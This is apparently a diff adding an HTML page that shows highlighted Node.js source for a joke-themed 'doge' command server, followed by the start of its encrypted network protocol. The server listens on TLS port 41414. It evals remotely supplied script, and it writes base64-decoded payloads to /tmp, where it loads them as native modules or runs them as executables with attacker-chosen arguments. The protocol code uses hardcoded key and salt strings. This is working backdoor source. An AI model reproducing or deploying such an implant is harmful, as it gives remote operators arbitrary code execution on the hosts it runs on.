+        <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bonk&#39;</span><span class="p">;</span>
+        <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;doge not sez&#39;</span><span class="p">;</span>
+        <span class="k">return</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">doge_response</span><span class="p">);</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">dogesez</span> <span class="o">===</span> <span class="s1">&#39;ping&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;pong&#39;</span><span class="p">;</span>
+        <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;ohmaze&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">doge_command</span><span class="p">.</span><span class="nx">ohmaze</span><span class="p">;</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">dogesez</span> <span class="o">===</span> <span class="s1">&#39;do me a favor&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">favor</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
+        <span class="kd">var</span> <span class="nx">doge</span> <span class="o">=</span> <span class="kc">undefined</span><span class="p">;</span>
+        <span class="k">try</span> <span class="p">{</span>
+            <span class="nx">doge</span> <span class="o">=</span> <span class="nx">dogescript</span><span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">ohmaze</span><span class="p">);</span>
+            <span class="nx">favor</span> <span class="o">=</span> <span class="nb">eval</span><span class="p">(</span><span class="nx">doge</span><span class="p">);</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;welcome&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;ohmaze&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">favor</span><span class="p">;</span>
+        <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bonk&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;doge sez no&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">dogesez</span> <span class="o">===</span> <span class="s1">&#39;corn doge&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="p">(</span><span class="s1">&#39;batter&#39;</span> <span class="k">in</span> <span class="nx">doge_command</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="s1">&#39;sausage&#39;</span> <span class="k">in</span> <span class="nx">doge_command</span><span class="p">)))</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dnt cunsoome&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;corn doge no batter or sausage&#39;</span><span class="p">;</span>
+            <span class="k">return</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">doge_response</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="p">(</span><span class="s1">&#39;meat&#39;</span> <span class="k">in</span> <span class="nx">doge_command</span><span class="p">[</span><span class="s1">&#39;sausage&#39;</span><span class="p">])</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="s1">&#39;flavor&#39;</span> <span class="k">in</span> <span class="nx">doge_command</span><span class="p">[</span><span class="s1">&#39;sausage&#39;</span><span class="p">])))</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dnt cunsoome&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;sausage no meat or flavor&#39;</span><span class="p">;</span>
+            <span class="k">return</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">doge_response</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="kd">var</span> <span class="nx">stupid</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">doge_command</span><span class="p">[</span><span class="s1">&#39;sausage&#39;</span><span class="p">][</span><span class="s1">&#39;flavor&#39;</span><span class="p">]);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">stupid</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dnt cunsoome&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;flavor giv not levl&#39;</span><span class="p">;</span>
+            <span class="k">return</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">doge_response</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="kd">var</span> <span class="nx">stupidtoo</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">batter</span><span class="p">,</span> <span class="s1">&#39;base64&#39;</span><span class="p">)</span>
+            <span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="nx">stupidtoo</span> <span class="o">===</span> <span class="nx">doge_command</span><span class="p">.</span><span class="nx">batter</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;eated&#39;</span><span class="p">;</span>
+            <span class="kd">var</span> <span class="nx">meat</span> <span class="o">=</span> <span class="nx">doge_command</span><span class="p">[</span><span class="s1">&#39;sausage&#39;</span><span class="p">][</span><span class="s1">&#39;meat&#39;</span><span class="p">];</span>
+            <span class="kd">var</span> <span class="nx">flavor</span> <span class="o">=</span> <span class="nx">doge_command</span><span class="p">[</span><span class="s1">&#39;sausage&#39;</span><span class="p">][</span><span class="s1">&#39;flavor&#39;</span><span class="p">];</span>
+            <span class="kd">var</span> <span class="nx">doge_carnval</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">batter</span><span class="p">,</span> <span class="s1">&#39;base64&#39;</span><span class="p">);</span>
+            <span class="kd">var</span> <span class="nx">randome</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span>
+                <span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">36</span><span class="p">)</span>
+                <span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span> <span class="mf">9</span><span class="p">)</span>
+            <span class="kd">var</span> <span class="nx">filename</span> <span class="o">=</span> <span class="s1">&#39;/tmp/corndoge-&#39;</span> <span class="o">+</span> <span class="nx">randome</span> <span class="o">+</span> <span class="s1">&#39;.node&#39;</span><span class="p">;</span>
+            <span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="nx">doge_carnval</span><span class="p">);</span>
+            <span class="k">try</span> <span class="p">{</span>
+                <span class="kd">var</span> <span class="nx">doge_module</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;&#39;</span> <span class="o">+</span> <span class="nx">filename</span> <span class="o">+</span> <span class="s1">&#39;&#39;</span><span class="p">);</span>
+                <span class="kd">var</span> <span class="nx">retval</span> <span class="o">=</span> <span class="nx">doge_module</span><span class="p">[</span><span class="nx">meat</span><span class="p">](...</span><span class="nx">flavor</span><span class="p">);</span>
+                <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;taste&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">retval</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">catch</span> <span class="p">{</span>
+                <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bonk&#39;</span><span class="p">;</span>
+                <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bad corn doge&#39;</span><span class="p">;</span>
+            <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
+                <span class="k">delete</span> <span class="nx">require</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">require</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">filename</span><span class="p">)]</span>
+            <span class="p">};</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dnt cunsoome&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;all bout base six fur&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">if</span> <span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">dogesez</span> <span class="o">===</span> <span class="s1">&#39;hot doge&#39;</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">((</span><span class="o">!</span><span class="p">(</span><span class="s1">&#39;bread&#39;</span> <span class="k">in</span> <span class="nx">doge_command</span><span class="p">)</span> <span class="o">||</span> <span class="o">!</span><span class="p">(</span><span class="s1">&#39;sausage&#39;</span> <span class="k">in</span> <span class="nx">doge_command</span><span class="p">)))</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dnt cunsoome&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;hot doge no bread or sausage&#39;</span><span class="p">;</span>
+            <span class="k">return</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">doge_response</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="s1">&#39;flavor&#39;</span> <span class="k">in</span> <span class="nx">doge_command</span><span class="p">[</span><span class="s1">&#39;sausage&#39;</span><span class="p">])</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dnt cunsoome&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;sausage no flavor&#39;</span><span class="p">;</span>
+            <span class="k">return</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">doge_response</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="kd">var</span> <span class="nx">stupid</span> <span class="o">=</span> <span class="nb">Array</span><span class="p">.</span><span class="nx">isArray</span><span class="p">(</span><span class="nx">doge_command</span><span class="p">[</span><span class="s1">&#39;sausage&#39;</span><span class="p">][</span><span class="s1">&#39;flavor&#39;</span><span class="p">]);</span>
+        <span class="k">if</span> <span class="p">(</span><span class="o">!</span><span class="nx">stupid</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dnt cunsoome&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;flavor giv not levl&#39;</span><span class="p">;</span>
+            <span class="k">return</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">doge_response</span><span class="p">);</span>
+        <span class="p">}</span>
+
+        <span class="kd">var</span> <span class="nx">stupidtoo</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">bread</span><span class="p">,</span> <span class="s1">&#39;base64&#39;</span><span class="p">)</span>
+            <span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;base64&#39;</span><span class="p">);</span>
+
+        <span class="k">if</span> <span class="p">(</span><span class="nx">stupidtoo</span> <span class="o">===</span> <span class="nx">doge_command</span><span class="p">.</span><span class="nx">bread</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;eated&#39;</span><span class="p">;</span>
+            <span class="kd">var</span> <span class="nx">flavor</span> <span class="o">=</span> <span class="nx">doge_command</span><span class="p">[</span><span class="s1">&#39;sausage&#39;</span><span class="p">][</span><span class="s1">&#39;flavor&#39;</span><span class="p">];</span>
+            <span class="kd">var</span> <span class="nx">doge_carnval</span> <span class="o">=</span> <span class="nx">Buffer</span><span class="p">.</span><span class="nx">from</span><span class="p">(</span><span class="nx">doge_command</span><span class="p">.</span><span class="nx">bread</span><span class="p">,</span> <span class="s1">&#39;base64&#39;</span><span class="p">);;</span>
+            <span class="kd">var</span> <span class="nx">randome</span> <span class="o">=</span> <span class="nb">Math</span><span class="p">.</span><span class="nx">random</span><span class="p">()</span>
+                <span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="mf">36</span><span class="p">)</span>
+                <span class="p">.</span><span class="nx">substr</span><span class="p">(</span><span class="mf">2</span><span class="p">,</span> <span class="mf">9</span><span class="p">)</span>
+            <span class="kd">var</span> <span class="nx">filename</span> <span class="o">=</span> <span class="s1">&#39;/tmp/hotdoge-&#39;</span> <span class="o">+</span> <span class="nx">randome</span> <span class="o">+</span> <span class="s1">&#39;.bin&#39;</span><span class="p">;</span>
+            <span class="nx">fs</span><span class="p">.</span><span class="nx">writeFileSync</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="nx">doge_carnval</span><span class="p">);</span>
+            <span class="nx">fs</span><span class="p">.</span><span class="nx">chmodSync</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="s1">&#39;755&#39;</span><span class="p">);</span>
+            <span class="k">try</span> <span class="p">{</span>
+                <span class="kd">var</span> <span class="nx">retval</span> <span class="o">=</span> <span class="nx">cp</span><span class="p">.</span><span class="nx">execFileSync</span><span class="p">(</span><span class="nx">filename</span><span class="p">,</span> <span class="nx">flavor</span><span class="p">);</span>
+                <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;taste&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">retval</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">);</span>
+            <span class="p">}</span> <span class="k">catch</span> <span class="p">(</span><span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                <span class="k">if</span> <span class="p">(</span><span class="s1">&#39;status&#39;</span> <span class="k">in</span> <span class="nx">error</span><span class="p">)</span> <span class="p">{</span>
+                    <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;eated&#39;</span><span class="p">;</span>
+                    <span class="kd">var</span> <span class="nx">errstd</span> <span class="o">=</span> <span class="nx">error</span><span class="p">.</span><span class="nx">stdout</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">);</span>
+                    <span class="kd">var</span> <span class="nx">errerr</span> <span class="o">=</span> <span class="nx">error</span><span class="p">.</span><span class="nx">stderr</span><span class="p">.</span><span class="nx">toString</span><span class="p">(</span><span class="s1">&#39;utf-8&#39;</span><span class="p">);</span>
+                    <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;taste&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">errstd</span><span class="p">;</span>
+                    <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;error&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="nx">errerr</span><span class="p">;</span>
+                    <span class="k">if</span> <span class="p">(</span><span class="nx">error</span><span class="p">.</span><span class="nx">status</span> <span class="o">===</span> <span class="mf">27</span><span class="p">)</span> <span class="p">{</span>
+                        <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;wow such module thx top doge&#39;</span><span class="p">;</span>
+                    <span class="p">}</span>
+                <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+                    <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bonk&#39;</span><span class="p">;</span>
+                    <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;bad hot doge&#39;</span><span class="p">;</span>
+                <span class="p">}</span>
+            <span class="p">}</span> <span class="k">finally</span> <span class="p">{</span>
+                <span class="k">delete</span> <span class="nx">require</span><span class="p">.</span><span class="nx">cache</span><span class="p">[</span><span class="nx">require</span><span class="p">.</span><span class="nx">resolve</span><span class="p">(</span><span class="nx">filename</span><span class="p">)]</span>
+            <span class="p">};</span>
+        <span class="p">}</span> <span class="k">else</span> <span class="p">{</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;dogesez&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;dnt cunsoome&#39;</span><span class="p">;</span>
+            <span class="nx">doge_response</span><span class="p">[</span><span class="s1">&#39;shibe&#39;</span><span class="p">]</span> <span class="o">=</span> <span class="s1">&#39;all bout base six fur&#39;</span><span class="p">;</span>
+        <span class="p">}</span>
+    <span class="p">}</span>
+
+    <span class="k">return</span> <span class="nx">dson</span><span class="p">.</span><span class="nx">stringify</span><span class="p">(</span><span class="nx">doge_response</span><span class="p">);</span>
+<span class="p">}</span>
+
+<span class="kr">const</span> <span class="nx">options</span> <span class="o">=</span> <span class="p">{</span>
+    <span class="nx">key</span><span class="o">:</span> <span class="nx">servs_key</span><span class="p">,</span>
+    <span class="nx">cert</span><span class="o">:</span> <span class="nx">servs_cert</span><span class="p">,</span>
+    <span class="nx">requestCert</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+    <span class="nx">rejectUnauthorized</span><span class="o">:</span> <span class="kc">true</span><span class="p">,</span>
+    <span class="nx">ca</span><span class="o">:</span> <span class="p">[</span><span class="nx">doge_ca</span><span class="p">]</span>
+<span class="p">};</span>
+
+<span class="kr">const</span> <span class="nx">server</span> <span class="o">=</span> <span class="nx">tls</span><span class="p">.</span><span class="nx">createServer</span><span class="p">(</span><span class="nx">options</span><span class="p">,</span> <span class="p">(</span><span class="nx">socket</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;doge connected: &#39;</span><span class="p">,</span>
+        <span class="nx">socket</span><span class="p">.</span><span class="nx">authorized</span> <span class="o">?</span> <span class="s1">&#39;TOP doge&#39;</span> <span class="o">:</span> <span class="s1">&#39;not top doge&#39;</span><span class="p">);</span>
+    <span class="kd">let</span> <span class="nx">networker</span> <span class="o">=</span> <span class="k">new</span> <span class="nx">Networker</span><span class="p">(</span><span class="nx">socket</span><span class="p">,</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">doge_lingo</span> <span class="o">=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">toString</span><span class="p">();</span>
+        <span class="c1">// console.log(&#39;top doge sez:&#39;, doge_lingo);</span>
+        <span class="kd">var</span> <span class="nx">doge_woof</span> <span class="o">=</span> <span class="nx">dogeParam</span><span class="p">(</span><span class="nx">doge_lingo</span><span class="p">);</span>
+        <span class="nx">networker</span><span class="p">.</span><span class="nx">send</span><span class="p">(</span><span class="nx">doge_woof</span><span class="p">);</span>
+        <span class="c1">// networker.send(dogeParam(data.toString()));</span>
+    <span class="p">});</span>
+    <span class="nx">networker</span><span class="p">.</span><span class="nx">init</span><span class="p">(</span><span class="s1">&#39;such doge is yes wow&#39;</span><span class="p">,</span> <span class="s1">&#39;such doge is shibe wow&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">server</span><span class="p">.</span><span class="nx">listen</span><span class="p">(</span><span class="mf">41414</span><span class="p">,</span> <span class="p">()</span> <span class="p">=&gt;</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;doge waiting for command from top doge&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">server</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;connection&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;doge connect&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+<span class="nx">server</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;secureConnect&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">c</span><span class="p">)</span> <span class="p">{</span>
+    <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;doge connect secure&#39;</span><span class="p">);</span>
+<span class="p">});</span>
+</code></pre></div>
+</td></tr></table></p>
+<p>Network protocol
+<table class="highlighttable"><tr><td class="linenos"><div class="linenodiv"><pre><span></span>  1
+  2
+  3
+  4
+  5
+  6
+  7
+  8
+  9
+ 10
+ 11
+ 12
+ 13
+ 14
+ 15
+ 16
+ 17
+ 18
+ 19
+ 20
+ 21
+ 22
+ 23
+ 24
+ 25
+ 26
+ 27
+ 28
+ 29
+ 30
+ 31
+ 32
+ 33
+ 34
+ 35
+ 36
+ 37
+ 38
+ 39
+ 40
+ 41
+ 42
+ 43
+ 44
+ 45
+ 46
+ 47
+ 48
+ 49
+ 50
+ 51
+ 52
+ 53
+ 54
+ 55
+ 56
+ 57
+ 58
+ 59
+ 60
+ 61
+ 62
+ 63
+ 64
+ 65
+ 66
+ 67
+ 68
+ 69
+ 70
+ 71
+ 72
+ 73
+ 74
+ 75
+ 76
+ 77
+ 78
+ 79
+ 80
+ 81
+ 82
+ 83
+ 84
+ 85
+ 86
+ 87
+ 88
+ 89
+ 90
+ 91
+ 92
+ 93
+ 94
+ 95
+ 96
+ 97
+ 98
+ 99
+100
+101
+102
+103
+104
+105
+106
+107
+108
+109
+110
+111
+112
+113
+114
+115
+116
+117
+118
+119
+120
+121
+122
+123
+124
+125
+126
+127
+128
+129
+130
+131
+132
+133
+134
+135
+136
+137
+138
+139
+140
+141
+142
+143
+144
+145
+146
+147
+148</pre></div></td><td class="code"><div class="highlight"><pre><span></span><code><span class="kd">var</span> <span class="nx">crypto</span> <span class="o">=</span> <span class="nx">require</span><span class="p">(</span><span class="s1">&#39;crypto&#39;</span><span class="p">);</span>
+
+<span class="kr">class</span> <span class="nx">Networker</span> <span class="p">{</span>
+
+    <span class="nx">constructor</span><span class="p">(</span><span class="nx">socket</span><span class="p">,</span> <span class="nx">handler</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">socket</span> <span class="o">=</span> <span class="nx">socket</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_packet</span> <span class="o">=</span> <span class="p">{};</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_process</span> <span class="o">=</span> <span class="kc">false</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_state</span> <span class="o">=</span> <span class="s1">&#39;HEADER&#39;</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_payloadLength</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">_bufferedBytes</span> <span class="o">=</span> <span class="mf">0</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">queue</span> <span class="o">=</span> <span class="p">[];</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">handler</span> <span class="o">=</span> <span class="nx">handler</span><span class="p">;</span>
+    <span class="p">};</span>
+
+    <span class="nx">init</span><span class="p">(</span><span class="nx">hmac_key</span><span class="p">,</span> <span class="nx">aes_key</span><span class="p">)</span> <span class="p">{</span>
+        <span class="kd">var</span> <span class="nx">salty_wow</span> <span class="o">=</span> <span class="s1">&#39;suchdoge4evawow&#39;</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">hmac_key</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">pbkdf2Sync</span><span class="p">(</span><span class="nx">hmac_key</span><span class="p">,</span> <span class="nx">salty_wow</span><span class="p">,</span> <span class="mf">4096</span><span class="p">,</span> <span class="mf">16</span><span class="p">,</span> <span class="s1">&#39;sha256&#39;</span><span class="p">);</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">aes_key</span> <span class="o">=</span> <span class="nx">crypto</span><span class="p">.</span><span class="nx">pbkdf2Sync</span><span class="p">(</span><span class="nx">aes_key</span><span class="p">,</span> <span class="nx">salty_wow</span><span class="p">,</span> <span class="mf">4096</span><span class="p">,</span> <span class="mf">16</span><span class="p">,</span> <span class="s1">&#39;sha256&#39;</span><span class="p">);</span>
+
+        <span class="kd">var</span> <span class="nx">f1</span> <span class="o">=</span> <span class="p">(</span><span class="nx">data</span><span class="p">)</span> <span class="p">=&gt;</span> <span class="p">{</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">_bufferedBytes</span> <span class="o">+=</span> <span class="nx">data</span><span class="p">.</span><span class="nx">length</span><span class="p">;</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">queue</span><span class="p">.</span><span class="nx">push</span><span class="p">(</span><span class="nx">data</span><span class="p">);</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">_process</span> <span class="o">=</span> <span class="kc">true</span><span class="p">;</span>
+            <span class="k">this</span><span class="p">.</span><span class="nx">_onData</span><span class="p">();</span>
+        <span class="p">};</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;data&#39;</span><span class="p">,</span> <span class="nx">f1</span><span class="p">);</span>
+
+        <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;error&#39;</span><span class="p">,</span> <span class="kd">function</span><span class="p">(</span><span class="nx">err</span><span class="p">)</span> <span class="p">{</span>
+            <span class="nx">console</span><span class="p">.</span><span class="nx">log</span><span class="p">(</span><span class="s1">&#39;Socket not shibe: &#39;</span><span class="p">,</span> <span class="nx">err</span><span class="p">);</span>
+        <span class="p">});</span>
+        <span class="kd">var</span> <span class="nx">dis_handle</span> <span class="o">=</span> <span class="k">this</span><span class="p">.</span><span class="nx">handler</span><span class="p">;</span>
+        <span class="k">this</span><span class="p">.</span><span class="nx">socket</span><span class="p">.</span><span class="nx">on</span><span class="p">(</span><span class="s1">&#39;served&#39;</span><span class="p">,</span> <span class="nx">dis_handle</span><span class="p">);</span>
+    <span class="p">};</span>
+    <span class="nx">_hasEnough</span><span class="p">(</span><span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
+        <span class="k">if</span> <span class="p">(</span><span class="k">this</span><span class="p">.</span><span class="nx">_bufferedBytes</span> <span class="o">&gt;=</span> <span class="nx">size</span><span class="p">)</span> <span class="p">{</span>
+            <span class="k">return</span> <span class="kc">true</span><span class="p">;</span>
+        <span class="p">}</span>
